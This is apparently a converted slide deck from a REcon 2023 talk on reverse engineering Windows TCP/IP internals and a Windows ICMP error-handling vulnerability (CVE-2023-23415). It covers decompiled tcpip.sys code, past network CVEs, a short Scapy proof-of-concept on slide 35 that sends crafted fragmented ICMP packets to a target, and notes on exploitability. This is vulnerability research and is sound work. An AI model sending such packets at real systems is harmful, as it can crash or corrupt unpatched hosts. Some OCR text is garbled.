---
title: "The Hunt for Red October - One Ping Too Many"
speakers: ["Erik Egsgard"]
conference: "REcon"
conference_full: "REcon 2023"
edition: ""
year: 2023
source_pdf: "REcon 2023 Slides/Erik Egsgard_The Hunt for Red October - One Ping Too Many .pdf"
pages: 48
sha256: "a34b8675df905bad145bf2a85a0c419479d2044f18472508224c15dc3d5729d2"
text_chars: 17146
ocr_pages: 11
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.4
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:01:40Z"
---
# The Hunt for Red October - One Ping Too Many

**Speakers:** Erik Egsgard  
**Conference:** REcon 2023  
**Source:** `REcon 2023 Slides/Erik Egsgard_The Hunt for Red October - One Ping Too Many .pdf` (48 pages)


## Slide 1

RECon Montreal June 2023


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
re FIELD EFFECT
RED OCTOBER
One Ping Too Many
RECon Montreal June 2023
```

## Slide 2

## **About Me**

- Security Developer

- Malware detection and defence

- Previously was vulnerability researcher

2


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
About Me
= Security Developer
= Malware detection and defence
= Previously was vulnerability researcher
```

## Slide 3

## **Motivation**

- Share approach to large systems

- Windows networking internals knowledge

- Weird machines are fun

3

## Slide 4

## **Reversing Large Systems**

One Piece At A Time

## Slide 5

## **Bug Hunting**

- Understand the system

- More knowledge leads to > odds of success

- Complexity leads to bugs

- Public documentation, other research

- Past vulnerabilities

5

## Slide 6

## **Large Systems**

- Can't RE entire system

- Look for hints to promising locations (function names, strings, etc.)

- Use knowledge from research and analysis to locate interesting areas

   - Combine dynamic and static analysis

- Don't be afraid to be wrong

6

## Slide 7

## **Tips**

- Keep notes

- Cache limitations

- Function constraints or interesting behaviour

- Review notes periodically

7


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Tips
= Keep notes
= Cache limitations
= Function constraints or interesting behaviour
= Review notes periodically
```

## Slide 8

## **Tools**

- Disassembler (Ghidra, IDA, etc.)

   - Load public structures

- Kernel debugger (windbg)

- Python

   - Scapy to craft packets

- Wireshark

8

## Slide 9

## **Windows Networking Internals**

Can you count the drivers

## Slide 10

## **Windows TCPIP Stack**

10


> Recovered by OCR — confidence 84/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Windows
TC |> | |> USER MODE _
KERNEL MODE
Stack
NDIS Driver
```

## Slide 11

## **Windows Filtering Platform**

11


> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Windows
Filtering
Platform
Windows Filtering Platform Architecture Overview
Socket
Application Windows Legacy IPSec
3” Party Firewall Policy Service
Firewall
Ws2_32.4ll (mpssvc) (policyagent)
C management C management C management C management
API API API API
RPC RPC Interface (Management)
Application IKE protocol
— s UM filter engine le»! AuthiP protocol
RPC Runtime | <= 8 (ikeext)
= S oS Base Filtering Engine
(rpcrt4_dll) ge 8 (bfe)
2 IKE and IPsec layers
& UM RPC layers (v4iv6)
User Mode
Kemel Mode
TCPIIP Stack IOCTL Interface
(tcpip.sys)
Stream Layer Shim Stream/Datagram Data 7 7
Layer 3” Party Anti-Virus callout -}—>
| (v4iv6)
ALE Inbound/Outbound Control callout 5
connection management c ALE Layer =z of
( igement) < (v4lv6) < 32
Transport Layer Shim 5 ° a =
TCP / UDP zt
(TCP / UDP) TPsec Inbound/Outbound 3" Party NAT callout [-—») =
Framing Transport Layer
IPsec callout nal
Network Layer Shim Inbound/Outbound
IPv4 | IPv6 IP Layer
(v4iv6)
KM Filter Engine
11
```

## Slide 12

## **WFP Callouts**

- **tcpip** !IPSecInboundTransportFilterCalloutClassifyV4/6

- **tcpip** !IPSecOutboundTransportFilterCalloutClassifyV4/6

- **tcpip** !IPSecInboundTunnelFilterCalloutClassifyV4/6

- **tcpip** !IPSecOutboundTunnelFilterCalloutClassifyV4/6

- **tcpip** !IPSecForwardInboundTunnelFilterCalloutClassifyV4/6

- **tcpip** !IPSecForwardOutboundTunnelFilterCalloutClassifyV4/6

- **tcpip** !IPSecInboundAcceptAuthorizeCalloutClassify

- **tcpip** !IPSecAleConnectCalloutClassify

- **tcpip** !WfpEnforceSilentDrop

- **tcpip** !WfpAlepSetOptionsCalloutClassify

- **tcpip** !IPSecInboundTunnelAcceptAuthorizeCalloutClassify

- **tcpip** !FlpEdgeTraversalCalloutClassify

- **tcpip** !IdpCalloutClassifyV4/6

- **tcpip** !TcpTemplatesFilter

- **tcpip** !WfpAlepDbgLowboxSetByPolicyLoopbackCalloutClassify

- **tcpip** !WfpAlepSetOptionsCalloutClassify

   - **tcpip** !WfpAlepRioAppIdHelperCalloutClassify

   - **tcpip** !WfpAlepSetBindIfListCalloutClassify

   - **tcpip** !WfpVpnCalloutClassifyV4/6

   - **mpsdrv** !MpsQueryUserCallout

   - **mpsdrv** !MpsLoggingCallout

   - **mpsdrv** !MpsSecondaryConnectionsCallout

   - **mpsdrv** !MpsFlowEstablishedCallout

   - **mpsdrv** !MpsStreamFlowAnalysisCallout

   - **mpsdrv** !MpsStreamFlowAnalysisCallout

   - **Ndu** !NduFlowEstablishedClassify

   - **Ndu** !NduInboundTransportClassify

   - **Ndu** !NduOutboundTransportClassify

   - **Ndu** !NduInboundMacClassify

   - **Ndu** !NduOutboundMacClassify

   - **WdNisDrv** !wfp_callout::stream_classify

   - **WdNisDrv** !wfp_callout::flow_established_classify

- **tcpip** !WfpAlepPolicySilentModeCalloutClassify

12

## Slide 13

## **Network Drivers**

- agilevpn.sys • pacer.sys

- • asynmac.sys • PktMon.sys • bridge.sys • rasl2tp.sys • bthpan.sys • raspppoe.sys • FWPKCLNT.sys • raspptp.sys • ipfltdrv.sys • rassstp.sys • ipnat.sys • rspndr.sys • • l2bridge.sys tcpip.sys

- • lltdio.sys • tunnel.sys • mpsdrv.sys • vfpext.sys • • mslldp.sys vmswitch.sys

- • NdisImPlatform.sys • wanarp.sys • • ndiswan.sys WdiWiFi.sys

   - vfpext.sys

   - • vmswitch.sys

   - WdNisDrv.sys

- NetAdapterCx.sys

- • netio.sys • netvsc.sys

- wfplwfs.sys

- Winnat.sys

- •

- nwifi.sys xboxgip.sys

13

## Slide 14

TL Client Dispatch
Network Input
Raw Client
Network Transport
IP (v4/v6)
Card Dispatch
TCP Client
Protol Demux UDP Client
ICMP (v4/v6) IGMP
IPSec
IPv6 Options
AH/ESP

## **Network Input**

14

## Slide 15

## **Key Structures**

- Packet data handled with NET_BUFFER structures

15


> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Key Structures
Packet data handled with NET_BUFFER structures
NET_BUFFER
NetBufferHeader
ChecksumBias
Reserved
NdisReserved
MiniportReserved
NdisPoolHandle
NET_BUFFER_HEADER
NetBufferData
Link
NET_BUFFER_DATA
Next
DataLength
CurrentMdlOfiset
15
```

## Slide 16

## **NET_BUFFER MDL CHAIN**

16


> Recovered by OCR — confidence 84/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(i! FIELD EFFECT
MDL 4
NET BUFFER
MDL CHAIN
Total data i}
NULL
```

## Slide 17

## **Key Functions**

\```
NDIS_EXPORTED_ROUTINE
PVOID NdisGetDataBuffer(
[in]           NET_BUFFER *NetBuffer,
[in]           ULONG      BytesNeeded,
[in, optional] PVOID      Storage,
[in]           ULONG      AlignMultiple,
[in]           ULONG      AlignOffset
);
\```

- Returns pointer to packet data

- Storage parameter for contiguous data

- Fails if Storage is NULL and fragmented data

17

## Slide 18

## **Key Functions**

\```
NDIS_EXPORTED_ROUTINE
VOID NdisAdvanceNetBufferDataStart(
\```

\```
[in]           NET_BUFFER          *NetBuffer,
[in]           ULONG               DataOffsetDelta,
[in]           BOOLEAN             FreeMdl,
[in, optional] NET_BUFFER_FREE_MDL *FreeMdlHandler
);
\```

- Adjusts DataOffset

- Can free MDLs as data is consumed

- Corresponding _Retreat_ function

18

## Slide 19

## **Historical Vulnerabilities**

“Study history, study history. In history lies all the secrets of statecraft.” - Confucius

## Slide 20

## **Network CVEs**

|**ID**|**DoS**|**RCE**|**Stack**|**Heap**|**Frag**|
|---|---|---|---|---|---|
|**CVE-2013-3183**
_ICMPv6 Router Advertisement PoD_|X|||||
|**CVE-2020-16898**
_ICMPv6 Recursive DNS Server Option_||X|X||X|
|**CVE-2021-24086**
_IPv6 Nested Fragment_|X||||X|
|**CVE-2021-24074**
_IPv4 Fragment Reassembly_||X||X|X|
|**CVE-2021-24094**
_IPv6 Fragment Reassembly_||X||X|X|
|**CVE-2022-34718**
_IPv6 IPSEC ESP Fragmentation_||X||X|X|

20

## Slide 21

**CVE-2020-16898** _ICMPv6 Recursive DNS Server Option aka Bad Neighbour_

- Ipv6pHandleRouterAdvertisement

- Length mismatch between validation and processing

- Leads to processing of unvalidated options

\```
char localStorage[0x20];
\```

\```
data = NdisGetDataBuffer( NetBuffer,
optionLength, // Not validated
localStorage,
0, 0 );
\```

21

## Slide 22

**CVE-2021-24074/94** _IPv4/6 Fragment Reassembly_

- Ipv4pReassembleDatagram and Ipv6pReassembleDatagram

- Data confusion between fragments

- CVE-2021-24074 leads to out of bounds write

- CVE-2021-24094 leads to use after free

22

## Slide 23

**CVE-2022-34718** _IPv6 IPSEC ESP Fragmentation aka EvilESP_

- Ipv6ReassembleDatagram and IppReceiveEsp

- Out of order IPv6 options

- Options offset can point past end of fragment

- Leads to single byte memory corruption

- `// nextheader_offset is bigger than header buffer header[ Reassembly->nextheader_offset ] = Reassembly->nextheader_value;`

23

## Slide 24

## **Path to 0day**

Putting it all together

## Slide 25

## **Code of Interest**

\```
0: kd> x tcpip!*error*
fffff805`5c7fefe0 tcpip!IppSendErrorListForDiscardReason(void)
fffff805`5c8204e0 tcpip!WfpReportSysErrorAsNtStatus(void)
fffff805`5c820244 tcpip!IppAllocateIcmpError(void)
fffff805`5c81f4a8 tcpip!WfpCheckForTupleStateOnIcmpError(void)
fffff805`5c7bae6c tcpip!Icmpv4pHandleError(void)
fffff805`5c847dfc tcpip!WfpReportError(void)
fffff805`5c84a064 tcpip!Icmpv6pHandleError(void)
fffff805`5c848f98 tcpip!Icmpv6pHandleEchoReplyAndError(void)
fffff805`5c98b680 tcpip!SettingTcpAutotuningError
fffff805`5c8f1564 tcpip!IsICMPError(IsICMPError)
fffff805`5c8f17b0 tcpip!ProcessIcmpErrorClassify(ProcessIcmpErrorClassify)
fffff805`5c92ec10 tcpip!IpIpsProviderSendIcmpError(IpIpsProviderSendIcmpError)
fffff805`5c916ac4 tcpip!WfpReportSysErrorAsWinError(WfpReportSysErrorAsWinError)
fffff805`5c98b640 tcpip!PolicyKeynameSizeZeroError
…
\```

\```
0: kd> x tcpip!*fragment*
fffff805`5c801e70 tcpip!Ipv6pFragmentPacketHelper (void)
fffff805`5c801590 tcpip!Ipv4pFragmentPacketHelper (void)
fffff805`5c94c360 tcpip!Ipv4pFragmentLookup (void)
fffff805`5c7fd220 tcpip!IppFragmentPackets(void)
fffff805`5c939a90 tcpip!IppAddFragmentToGroup(void)
fffff805`5c93a10c tcpip!IppFindLocationInFragmentGroup(void)
fffff805`5c93a1d0 tcpip!IppFindOrCreateGroupForFragment(void)
fffff805`5c94cbec tcpip!Ipv4pReceiveFragment(Ipv4pReceiveFragment)
fffff805`5c9ece40 tcpip!UrlpFeedQueryAndFragment(UrlpFeedQueryAndFragment)
fffff805`5c9524cc tcpip!Ipv6pFragmentLookup (Ipv6pFragmentLookup)
fffff805`5c952ee0 tcpip!Ipv6pReceiveFragment(Ipv6pReceiveFragment)
fffff805`5c952470 tcpip!Ipv6pAuthenticateFragmentHeader (Ipv6pAuthenticateFragmentHeader)
fffff805`5c9472d8 tcpip!Ipv4pCompactFragmentationHeader (Ipv4pCompactFragmentationHeader)
…
\```

25

## Slide 26

## ICMP Error Packets

26


> Recovered by OCR — confidence 93/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
yc! FIELD EFFECT
ICMP Error Packets
ICMP Message
IP header ICMP header IP header 8 bytes of payload
type code checksum
Unused (0x00000000)
¢ ICMP error messages include the complete IP header and
the first 8 bytes of the payload (typically: UDP, TCP)
26
```

## Slide 27

## ProcessIcmpErrorClassify()

**IcmpErrorClassify**

\```
void ProcessIcmpErrorClassify( NET_BUFFER *NetBuffer)
{
// Skip inner IP header to get protocol details
status = IppInspectSkipNetworkLayerHeaders( NetBuffer, &headerLength);
if ( 0 <= status ) {
\```

\```
NetioAdvanceNetBuffer( NetBuffer, headerLength);
WfpGetTLInfoForReceiveOnRawEndpoint( netBuffer, &tlInfo);
NetioRetreatNetBuffer( NetBuffer, headerLength, 0x0 );
\```

\```
if ( addr_type== AF_INET ) {
status = WfpInspectReceiveControlShimV4( NetBuffer, tlInfo);
}
if ( addr_type== AF_INET6 ) {
status = WfpInspectReceiveControlShimV6( NetBuffer, tlInfo);
}
}
return;
\```

\```
}
\```

27

## Slide 28

## Ipv4pSkipNetworkLayerHeaders()

IcmpErrorClassify

**SkipHeaders**

\```
uintIpv4pSkipNetworkLayerHeaders( void *NetBuffer)
{
char localStorage[0x14];
if( NetBuffer->DataLength>= 0x14 )
{
\```

\```
ipHeader= NdisGetDataBuffer( NetBuffer, 0x14, localStorage, 0x4 );
ipHeaderLength= (*ipHeader& 0xf) << 0x2;
\```

\```
if( 0x13 < ipHeaderLength&& ipHeaderLength<= NetBuffer->DataLength) {
if( ipHeaderLength!= 0x14 ) {
\```

\```
NetioAdvanceNetBuffer( NetBuffer, 0x14 );
uVar3 = Ipv4ProcessOptionsHelper( NetBuffer
\```

\```
ipHeaderLength-0x14,
\```

\```
NULL,
... );
\```

\```
NetioRetreatNetBuffer( NetBuffer, 0x14 );
\```

\```
}
\```

\```
}
\```

\```
}
\```

\```
}
\```

28

## Slide 29

## Ipv4ProcessOptionsHelper()

\```
uintIpv4ProcessOptionsHelper( NET_BUFFER *NetBuffer, uintBufferLength,
RECEIVE_CONTEXT *ContextData, ...)
{
lengthProcessed= 0x0;
packetStart= NetBuffer->CurrentMdl->MappedSystemVa;
packetData= (byte *)( NetBuffer->CurrentMdlOffset+ packetStart);
if (BufferLength!= 0x0) {
do {
optionCode= packetData[0];
optionLength= packetData[1];
if( optionLength> BufferLength) { return 0xc000021b; }
// Process Option
bufferLength= bufferLength-optionLength;
packetData= packetData+ optionLength;
} while (bufferLength!= 0x0);
}
return 0x0;
}
\```

???

IcmpErrorClassify

SkipHeaders

**ProcessOptions**

29

## Slide 30

WfpProcessInTransport StackIndication()

#### **WfpTransportIn**

IcmpErrorClassify

SkipHeaders

ProcessOptions

\```
uintWfpProcessInTransportStackIndication( void* Arg0, NET_BUFFER *NetBuffer, ...)
{
// Lots of stuff happens
if( Arg0->field_2fc & 0x20 ) {
ProcessIcmpErrorClassify( NetBuffer);
}
// More stuff happens
return 0x0;
}
\```

30

## Slide 31

## **Making Sense of the Data**

\```
ContextData->field_0x110 = uVar1;
ContextData->field_0x2fc |= 0x8;
\```

\```
0: kd> !pool @r13
Pool page ffff92867ff21a20 region is Nonpaged pool
ffff92867ff21000 size:  a00 previous size:    0  (Allocated)  Thre
*ffff92867ff21a10 size:  300 previous size:    0  (Allocated) *AleE
PooltagAleE: ALE endpoint context, Binary : tcpip.sys
\```

\```
0: kd> x tcpip!*aleendpoint*
fffff801`536333e0 tcpip!WfpAleEndpointCreationHandler(void)
fffff801`535c42c8 tcpip!WfpAleEndpointTeardownHandler(void)
fffff801`53610f60 tcpip!WfpAleEndpointDeactivationHandler(void)
\```

\```
ContextData->AleEndpoint= aleEndpoint;
ContextData->Flags |= 0x8;
\```

31

## Slide 32

#### **WfpTransportIn**

WfpProcessInTransport StackIndication()

IcmpErrorClassify

SkipHeaders

ProcessOptions

\```
uintWfpProcessInTransportStackIndication( void* AleEndpoint, NET_BUFFER *NetBuffer, ...)
{
\```

- `// Lots of stuff happens`

\```
if( AleEndpoint->Flags & IS_RAW_SOCKET ) {
ProcessIcmpErrorClassify( NetBuffer);
}
// More stuff
return 0x0;
}
\```

32

## Slide 33

## Proof of Concept

Outer ICMP Body
(aka error packet)
ICMP HEADER IP HEADER ICMP HEADER
IP HEADER
(Type 12 = Param Err) (with options) (Type 0 = Echo Reply)
Not fragmentable

### **Target Fragment Location**

33

## Slide 34

34


> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[| FIELD EFFECT
Give me a ping Vasili...
```

## Slide 35

## Proof of Concept

\```
importscapy.allas scpy
def send_f(frags):
for f in frags:
scpy.send(f)
print("Sending nested ICMP Error")
send_f(fragment(IP(dst=target_ip) /
ICMP(type=12) /
IPerror(src="192.168.0.1",
options=b"\x95\x26" + b"\x00" * 0x26 /
ICMP(),
fragsize=32), iface)
\```

35

## Slide 36

36


> Recovered by OCR — confidence 76/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[| FIELD EFFECT
&
BH Administrator: Command Prompt
IPv4 Addre
sub k
A
1:01 PM
3/8/2023
36
```

## Slide 37

## Alternate Call Paths

- MSRC bulletin implied raw sockets were required

- Possible to reach with ICMP over IPSec tunnels

37


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Alternate Call Paths
MSRC bulletin implied raw sockets were required
Possible to reach with ICMP over IPSec tunnels
References to IppInspectSkipNetworkLayerHeaders - 10 locations
Label
Context
37
```

## Slide 38

## **CVSS 9.8**

Where is the RCE?

## Slide 39

## CVE-2023-23415

- Original bug report was a DoS

- 2 months after confirmation, upgraded to RCE

- Is MSRC very, very conservative, or...

- Is there another code path?

39

## Slide 40

## Ipv4pSkipNetworkLayerHeaders()

IcmpErrorClassify

**SkipHeaders**

\```
uintIpv4pSkipNetworkLayerHeaders( void *NetBuffer)
{
char localStorage[0x14];
if( NetBuffer->DataLength>= 0x14 )
{
\```

\```
ipHeader= NdisGetDataBuffer( NetBuffer, 0x14, localStorage, 0x4 );
ipHeaderLength= (*ipHeader& 0xf) << 0x2;
\```

\```
if( 0x13 < ipHeaderLength&& ipHeaderLength<= NetBuffer->DataLength) {
if( ipHeaderLength!= 0x14 ) {
\```

\```
NetioAdvanceNetBuffer( NetBuffer, 0x14 );
uVar3 = Ipv4ProcessOptionsHelper( NetBuffer
\```

\```
ipHeaderLength-0x14,
NULL,
... );
\```

\```
NetioRetreatNetBuffer( NetBuffer, 0x14 );
\```

\```
}
\```

\```
}
\```

\```
}
\```

\```
}
\```

40

## Slide 41

## Ipv4ProcessOptionsHelper()

WfpTransportIn

IcmpErrorClassify

SkipHeaders

**ProcessOptions**

\```
uintIpv4ProcessOptionsHelper( NET_BUFFER *NetBuffer, uintBufferLength,
RECEIVE_CONTEXT *ContextData, ...)
{
lengthProcessed= 0x0;
packetStart= NetBuffer->CurrentMdl->MappedSystemVa;
packetData= (byte *)( NetBuffer->CurrentMdlOffset+ packetStart);
if (BufferLength!= 0x0) {
do {
optionCode= packetData[0];
optionLength= packetData[1];
if( optionLength> BufferLength) { return 0xc000021b; }
// Process Timestamp Option
if( optionCode== 0x44 && ContextData!= NULL ) {
Ipv4pProcessTimestampOption( ContextData, (char *)packetData);
}
\```

41

## Slide 42

## IP Timestamp Option

The IP Timestamps Option records the time (in Universal Time) when each network device receives the packet during its trip from the point of origin to its destination

42

## Slide 43

## Alternate Call Paths (Part 2)

\```
0: kd> dpstcpip!Ipv4Global+50
fffff805`5c9ab050  00000000`00000004
fffff805`5c9ab058  fffff805`5c811f90 tcpip!Ipv4pValidateNetBuffer
fffff805`5c9ab060  fffff805`5c8345a0 tcpip!Ipv4pAddressInterface
fffff805`5c9ab068  fffff805`5c85bb80 tcpip!Ipv4pAddLinkLayerSuffixAddresses
fffff805`5c9ab070  fffff805`5c821580 tcpip!Ipv4pUnAddressInterface
fffff805`5c9ab078  fffff805`5c83ab70 tcpip!Ipv4pInitializeSubInterface
fffff805`5c9ab080  00000000`00000000
\```

Ipv4pValidateNetBuffer -> Ipv4pProcessOptions -> Ipv4ProcessOptionsHelper _(with Receive Context pointer)_

43

## Slide 44

## IPSec

- IKEv1 vs IKEv2

- AH vs ESP vs AH+ESP

- Transport mode vs Tunnel mode

- Main mode vs Aggressive mode

- Other VPN implementations

44

## Slide 45

## Exploitation

- Controlled:

   - Allocation Size

   - • Overwrite Offset

- Not Controlled:

   - Overwrite Contents

   - • Overwrite Length

- Not impossible but definitely non-trivial

45

## Slide 46

## **Conclusions**

Computers are hard

## Slide 47

## References

- CVE-2020-1689: <u>http://blog.pi3.com.pl/?p=780</u>

- CVE-2021-24074, CVE-2021-24094

<u>https://www.armis.com/blog/from-urgent11-to-frag44-analysis-of-critical-vulnerabilities-in-the-windows-tcpip-stack/</u>

- CVE-2022-34718 <u>https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/</u>

47

## Slide 48

# **That's all folks!**

@hexnomad@infosec.exchange
